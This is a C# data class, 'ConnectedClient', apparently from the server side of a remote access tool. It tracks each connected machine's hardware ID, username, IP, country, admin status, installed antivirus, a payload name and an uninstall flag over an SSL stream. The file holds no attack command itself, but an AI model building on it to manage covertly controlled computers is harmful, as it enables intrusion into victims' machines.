using System.Net.Security;

namespace SeroServer.Data;

public class ConnectedClient
{
    public string Id { get; set; } = Guid.NewGuid().ToString("N")[..8];
    public string Hwid { get; set; } = string.Empty;
    public string InstanceId { get; set; } = string.Empty;
    public string Username { get; set; } = string.Empty;
    public string IP { get; set; } = string.Empty;
    public string OS { get; set; } = string.Empty;
    public string MachineName { get; set; } = string.Empty;
    public bool IsAdmin { get; set; }
    public string Privilege => IsAdmin ? "Admin" : "User";
    public string Country { get; set; } = "...";
    public string CountryCode { get; set; } = "";
    public string CountryDisplay => string.IsNullOrEmpty(CountryCode) ? Country : $"[{CountryCode.ToUpper()}] {Country}";
    public string Payload { get; set; } = string.Empty;
    public string Antivirus { get; set; } = string.Empty;
    public string Tag { get; set; } = string.Empty;
    public DateTime FirstSeen { get; set; } = DateTime.UtcNow;
    public DateTime ConnectedAt { get; set; } = DateTime.UtcNow;
    public DateTime LastHeartbeat { get; set; } = DateTime.UtcNow;
    public DateTime PingSentAt { get; set; }
    public int PingMs { get; set; } = -1;
    public string PingDisplay => PingMs < 0 ? "..." : $"{PingMs} ms";
    public SslStream? Stream { get; set; }
    public SemaphoreSlim WriteLock { get; } = new(1, 1);
    public CancellationTokenSource Cts { get; set; } = new();

    public bool IsAlive => (DateTime.UtcNow - LastHeartbeat).TotalSeconds < 30;
    public bool PendingUninstall { get; set; }
}
